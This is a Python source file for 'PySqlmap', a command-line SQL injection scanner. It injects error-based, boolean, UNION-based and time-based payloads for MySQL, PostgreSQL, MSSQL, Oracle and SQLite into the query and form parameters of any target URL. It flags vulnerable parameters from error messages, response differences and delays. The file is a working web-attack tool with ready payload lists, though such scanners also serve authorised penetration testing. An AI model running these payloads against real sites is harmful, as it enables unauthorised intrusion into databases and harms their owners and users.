import asyncio
import click
import json
import os
import random
import re
import sys
import time
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple
import httpx
from rich.console import Console
from tqdm import tqdm
console = Console()
ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"Warning.*mysql_.*", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"MySqlException", "MySQL"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"Warning.*pg_.*", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"Driver.*SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.*SQL Server", "MSSQL"),
    (r"(\W|\A)SQL.*Server.*Driver", "MSSQL"),
    (r"Warning.*mssql_.*", "MSSQL"),
    (r"(\W|\A)SQL.*Server.*[0-9a-fA-F]{8}", "MSSQL"),
    (r"Exception.*\WSystem\.Data\.SqlClient\.", "MSSQL"),
    (r"Exception.*\WRoadhouse\.Cms\.", "MSSQL"),
    (r"Oracle error", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"Warning.*oci_.*", "Oracle"),
    (r"Warning.*ora_.*", "Oracle"),
    (r"Microsoft Access Driver", "MSAccess"),
    (r"JET Database Engine", "MSAccess"),
    (r"Access Database Engine", "MSAccess"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"SQLite.Exception", "SQLite"),
    (r"System.Data.SQLite.SQLiteException", "SQLite"),
    (r"Warning.*sqlite_.*", "SQLite"),
    (r"Warning.*SQLite3::", "SQLite"),
    (r"\[SQLite_ERROR\]", "SQLite"),
    (r"sqlite3.OperationalError", "SQLite"),
    (r"sqlite3.SyntaxError", "SQLite"),
    (r"Syntax error.*SELECT", "Generic"),
    (r"Syntax error.*INSERT", "Generic"),
    (r"Syntax error.*UPDATE", "Generic"),
    (r"Syntax error.*DELETE", "Generic"),
    (r"Syntax error.*UNION", "Generic"),
    (r"Syntax error.*FROM", "Generic"),
    (r"Syntax error.*WHERE", "Generic"),
    (r"You have an error in your SQL syntax", "Generic"),
    (r"Unclosed quotation mark", "Generic"),
    (r"quoted string not properly terminated", "Oracle"),
    (r"Unterminated.*string", "Generic"),
]
BOOL_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' AND '1'='2"),
    (" AND 1=1", " AND 1=2"),
    (" OR 1=1", " AND 1=2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
]
TIME_PAYLOADS = [
    ("' AND (SELECT * FROM (SELECT(SLEEP(2)))a) AND '1'='1", "MySQL"),
    ("' AND 3436=(SELECT 3436 FROM PG_SLEEP(2)) AND '1'='1", "PostgreSQL"),
    ("'; WAITFOR DELAY '0:0:2'--", "MSSQL"),
    ("' AND 123=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66),2) AND '1'='1", "Oracle"),
    ("' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))) AND '1'='1", "SQLite"),
]
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
]
def now() -> str:
    return datetime.now().isoformat()
class Finding:
    def __init__(self, url: str, param: str, method: str, ptype: str, dbms: str = "", payload: str = "", detail: str = ""):
        self.url = url
        self.param = param
        self.method = method
        self.ptype = ptype
        self.dbms = dbms
        self.payload = payload
        self.detail = detail
        self.time = now()
    def to_dict(self) -> dict:
        return {"url": self.url, "param": self.param, "method": self.method, "type": self.ptype, "dbms": self.dbms, "payload": self.payload, "detail": self.detail, "time": self.time}
class PySqlmap:
    def __init__(self, url: str, data: str, cookie: str, user_agent: str, headers: Tuple[str, ...], level: int, risk: int, threads: int, timeout: float, output: Optional[str], verbose: bool, proxy: Optional[str], method: str, forms: bool, batch: bool):
        self.url = url
        self.data = data
        self.cookie = cookie
        self.user_agent = user_agent
        self.headers = self._parse_headers(headers)
        self.level = level
        self.risk = risk
        self.threads = threads
        self.timeout = timeout
        self.output = output
        self.verbose = verbose
        self.proxy = proxy
        self.method = method.upper() if method else ("POST" if data else "GET")
        self.forms = forms
        self.batch = batch
        self.findings: List[Finding] = []
        self.start_time = time.time()
        self.client = httpx.AsyncClient(http2=True, timeout=httpx.Timeout(timeout), verify=False, limits=httpx.Limits(max_keepalive_connections=50, max_connections=100))
        if proxy:
            self.client = httpx.AsyncClient(http2=True, timeout=httpx.Timeout(timeout), verify=False, limits=httpx.Limits(max_keepalive_connections=50, max_connections=100), proxy=proxy)
        self.baseline: Dict[str, Tuple[int, int, str]] = {}
        self.lock = asyncio.Lock()
    def _parse_headers(self, hdrs: Tuple[str, ...]) -> Dict[str, str]:
        out = {}
        for h in hdrs:
            if ":" in h:
                k, v = h.split(":", 1)
                out[k.strip()] = v.strip()
        return out
    def _build_headers(self) -> Dict[str, str]:
        hdrs = dict(self.headers)
        if self.user_agent:
            hdrs["User-Agent"] = self.user_agent
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        return hdrs
    async def _req(self, url: str, method: str = "GET", data: Optional[str] = None, headers: Optional[Dict[str, str]] = None) -> Tuple[int, int, str]:
        try:
            hdrs = dict(headers) if headers else self._build_headers()
            if method == "GET":
                r = await self.client.get(url, headers=hdrs)
            else:
                r = await self.client.post(url, headers=hdrs, content=data.encode() if data else None)
            return r.status_code, len(r.text), r.text
        except Exception as e:
            return 0, 0, str(e)
    async def run(self):
        self._banner()
        targets = await self._enumerate_targets()
        if not targets:
            console.print("[red][!] No targets to test[/red]")
            return
        for target_url, method, params in targets:
            await self._test_target(target_url, method, params)
        self._summary()
        self._save()
        await self.client.aclose()
    def _banner(self):
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
        console.print("[bold cyan] PySqlmap v1.0 - SQL Injection Detection Tool[/bold cyan]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
        console.print(f"[cyan]Target: {self.url}[/cyan]")
        console.print(f"[cyan]Method: {self.method}[/cyan]")
        console.print(f"[cyan]Level: {self.level} | Risk: {self.risk} | Threads: {self.threads}[/cyan]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
    async def _enumerate_targets(self) -> List[Tuple[str, str, List[str]]]:
        targets = []
        if self.forms:
            console.print("[cyan][*] Searching for forms...[/cyan]")
            status, length, body = await self._req(self.url)
            forms = self._parse_forms(self.url, body)
            for action, method, inputs in forms:
                targets.append((action, method, inputs))
                console.print(f"[green][+] Form found: {action} ({method})[/green]")
        parsed = urllib.parse.urlparse(self.url)
        qs = urllib.parse.parse_qs(parsed.query)
        if qs:
            targets.append((self.url, "GET", list(qs.keys())))
        if self.data:
            ps = urllib.parse.parse_qs(self.data)
            targets.append((self.url, self.method, list(ps.keys())))
        return targets
    def _parse_forms(self, base_url: str, html: str) -> List[Tuple[str, str, List[str]]]:
        forms = []
        form_tags = re.findall(r"<form[^>]*>(.*?)</form>", html, re.DOTALL | re.IGNORECASE)
        for raw in form_tags:
            action = ""
            m = re.search(r'action=[\"\']([^\"\']*)[\"\']', raw, re.IGNORECASE)
            if m:
                action = urllib.parse.urljoin(base_url, m.group(1))
            else:
                action = base_url
            method = "GET"
            m = re.search(r'method=[\"\']([^\"\']*)[\"\']', raw, re.IGNORECASE)
            if m:
                method = m.group(1).upper()
            inputs = re.findall(r'<input[^>]*name=[\"\']([^\"\']*)[\"\']', raw, re.IGNORECASE)
            if inputs:
                forms.append((action, method, inputs))
        return forms
    async def _test_target(self, url: str, method: str, params: List[str]):
        console.print(f"[cyan][*] Testing {url} ({method})[/cyan]")
        console.print(f"[cyan]    Parameters: {', '.join(params)}[/cyan]")
        sem = asyncio.Semaphore(self.threads)
        tasks = [self._test_param(url, method, param, sem) for param in params]
        await asyncio.gather(*tasks)
    async def _test_param(self, url: str, method: str, param: str, sem: asyncio.Semaphore):
        async with sem:
            await self._get_baseline(url, method, param)
            await self._test_error(url, method, param)
            if self.level >= 1:
                await self._test_boolean(url, method, param)
            if self.level >= 2:
                await self._test_union(url, method, param)
            if self.level >= 3:
                await self._test_time(url, method, param)
    async def _get_baseline(self, url: str, method: str, param: str):
        key = f"{method}:{url}:{param}"
        if key in self.baseline:
            return
        status, length, body = await self._req(url, method, self.data)
        self.baseline[key] = (status, length, body)
    def _inject(self, url: str, method: str, param: str, payload: str) -> Tuple[str, Optional[str]]:
        parsed = urllib.parse.urlparse(url)
        if method == "GET":
            qs = urllib.parse.parse_qs(parsed.query)
            if param in qs:
                qs[param] = [payload]
                new_qs = urllib.parse.urlencode(qs, doseq=True)
                new_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_qs, parsed.fragment))
                return new_url, None
        else:
            ps = urllib.parse.parse_qs(self.data) if self.data else {}
            if param in ps:
                ps[param] = [payload]
                new_data = urllib.parse.urlencode(ps, doseq=True)
                return url, new_data
        return url, None
    async def _test_error(self, url: str, method: str, param: str):
        payloads = ["'", "\\\"", "')", "')--", "' OR '1'='1", "\\\" OR \\\"1\\\"=\\\"1"]
        for p in payloads:
            new_url, new_data = self._inject(url, method, param, p)
            status, length, body = await self._req(new_url, method, new_data)
            for pattern, dbms in ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    await self._add_finding(url, param, method, "error-based", dbms, p, "SQL error in response")
                    return
    async def _test_boolean(self, url: str, method: str, param: str):
        key = f"{method}:{url}:{param}"
        base_status, base_length, base_body = self.baseline.get(key, (0, 0, ""))
        for true_p, false_p in BOOL_PAYLOADS:
            t_url, t_data = self._inject(url, method, param, true_p)
            f_url, f_data = self._inject(url, method, param, false_p)
            t_status, t_length, t_body = await self._req(t_url, method, t_data)
            f_status, f_length, f_body = await self._req(f_url, method, f_data)
            t_diff = abs(t_length - base_length)
            f_diff = abs(f_length - base_length)
            if t_status == base_status and f_status == base_status and t_diff < base_length * 0.05 and f_diff > base_length * 0.1:
                await self._add_finding(url, param, method, "boolean-based", "", true_p, "Response length differs between true and false conditions")
                return
            if t_status == base_status and f_status != base_status:
                await self._add_finding(url, param, method, "boolean-based", "", true_p, f"Status code differs: true={t_status} false={f_status}")
                return
    async def _test_union(self, url: str, method: str, param: str):
        for p in UNION_PAYLOADS:
            new_url, new_data = self._inject(url, method, param, p)
            status, length, body = await self._req(new_url, method, new_data)
            if "UNION" in body.upper() or re.search(r"\d+\s+\|\s+[a-zA-Z]", body):
                await self._add_finding(url, param, method, "UNION-based", "", p, "UNION pattern in response")
                return
    async def _test_time(self, url: str, method: str, param: str):
        for p, dbms in TIME_PAYLOADS:
            new_url, new_data = self._inject(url, method, param, p)
            start = time.time()
            status, length, body = await self._req(new_url, method, new_data)
            elapsed = time.time() - start
            if elapsed >= 1.5:
                await self._add_finding(url, param, method, "time-based", dbms, p, f"Response delayed {elapsed:.2f}s")
                return
    async def _add_finding(self, url: str, param: str, method: str, ptype: str, dbms: str, payload: str, detail: str):
        async with self.lock:
            for f in self.findings:
                if f.url == url and f.param == param and f.ptype == ptype:
                    return
            f = Finding(url, param, method, ptype, dbms, payload, detail)
            self.findings.append(f)
            color = "red" if ptype in ("error-based", "UNION-based") else "yellow"
            console.print(f"[{color}][!] {ptype.upper()} SQLi | {method} | {url} | param={param} | dbms={dbms} | payload={payload}[/{color}]")
    def _summary(self):
        elapsed = time.time() - self.start_time
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
        if not self.findings:
            console.print("[green][*] No SQL injection vulnerabilities detected[/green]")
        else:
            console.print(f"[bold red][!] {len(self.findings)} potential SQL injection point(s) found[/bold red]")
            for f in self.findings:
                console.print(f"[red]    {f.ptype} | {f.method} | {f.param} | {f.dbms or 'unknown'}[/red]")
        console.print(f"[cyan][*] Scan completed in {elapsed:.2f}s[/cyan]")
        console.print("[cyan]" + "=" * 60 + "[/cyan]")
    def _save(self):
        if not self.output:
            return
        data = {
            "target": self.url,
            "findings": [f.to_dict() for f in self.findings],
        }
        ext = os.path.splitext(self.output)[1].lower()
        try:
            if ext == ".json":
                with open(self.output, "w") as f:
                    json.dump(data, f, indent=2)
            else:
                with open(self.output, "w") as f:
                    f.write(f"PySqlmap Report for {self.url}\\n")
                    f.write("=" * 50 + "\\n")
                    for finding in self.findings:
                        f.write(f"[{finding.ptype}] {finding.method} {finding.url} param={finding.param} dbms={finding.dbms}\\n")
                        f.write(f"    Payload: {finding.payload}\\n")
                        f.write(f"    Detail: {finding.detail}\\n\\n")
            console.print(f"[green][+] Report saved to {self.output}[/green]")
        except Exception as e:
            console.print(f"[red][!] Failed to save: {e}[/red]")
@click.command()
@click.option("-u", "--url", required=True, help="Target URL")
@click.option("--data", default="", help="POST data")
@click.option("--cookie", default="", help="Cookie string")
@click.option("--user-agent", default="", help="User-Agent")
@click.option("-H", "--header", multiple=True, help="Custom header")
@click.option("--level", default=1, type=int, help="Test level (1-5)")
@click.option("--risk", default=1, type=int, help="Risk level (1-3)")
@click.option("--threads", default=5, type=int, help="Concurrent threads")
@click.option("--timeout", default=30.0, type=float, help="Request timeout")
@click.option("-o", "--output", help="Output file")
@click.option("-v", "--verbose", is_flag=True, help="Verbose output")
@click.option("--proxy", help="Proxy URL")
@click.option("--method", help="HTTP method")
@click.option("--forms", is_flag=True, help="Test forms on target URL")
@click.option("--batch", is_flag=True, help="Never ask for user input")
def cli(url, data, cookie, user_agent, header, level, risk, threads, timeout, output, verbose, proxy, method, forms, batch):
    scanner = PySqlmap(url, data, cookie, user_agent, header, level, risk, threads, timeout, output, verbose, proxy, method, forms, batch)
    asyncio.run(scanner.run())
if __name__ == "__main__":
    cli()
